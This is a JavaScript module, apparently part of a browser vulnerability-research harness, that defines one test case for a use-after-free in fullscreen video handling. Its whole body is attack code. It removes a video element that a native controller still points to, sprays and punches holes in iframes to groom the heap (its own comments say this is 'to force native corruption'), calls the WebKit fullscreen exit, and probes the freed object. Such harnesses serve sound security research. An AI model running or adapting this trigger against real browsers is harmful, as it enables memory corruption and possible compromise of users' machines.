import { GCOracle } from '../mod_executor.js';
import { Groomer } from '../mod_groomer.js';

export default {
    id:       'VIDEO_FULLSCREEN_REMOVE',
    category: 'Media',
    risk:     'HIGH',
    description:
        'HTMLVideoElement.remove() enquanto FullscreenVideoController mantém ponteiro bruto. ' +
        'O Heap é substituído por iframes para forçar corrupção nativa.',

    setup: function() {
        this.container = document.createElement('div');
        document.body.appendChild(this.container);
        this.video = document.createElement('video');
        this.video.setAttribute('playsinline', '');
        this.video.setAttribute('preload', 'auto');
        this.video.src = 'data:video/mp4;base64,AAAAFGZ0eXBtcDQyAAAAAG1wNDI=';
        this.container.appendChild(this.video);

        // 🚨 Oráculo
        if (GCOracle.registry) GCOracle.registry.register(this.video, `${this.id}_target`);
    },

    trigger: function() {
        this.video.remove(); 
        
        // 🚨 Grooming: Spray de objetos gordos na memória de Media
        let nodes = Groomer.sprayDOM('iframe', 50);
        Groomer.punchHoles(nodes, 2);

        document.webkitExitFullscreen?.();
    },

    probe: [
        s => s.video.duration,
        s => s.video.currentTime,
        s => s.video.readyState,
        s => s.video.networkState,
        s => s.video.videoWidth,
        s => s.video.buffered?.length,
        s => s.video.error?.code,
    ],

    cleanup: function() {
        try { this.container.remove(); } catch(e) {}
    }
};
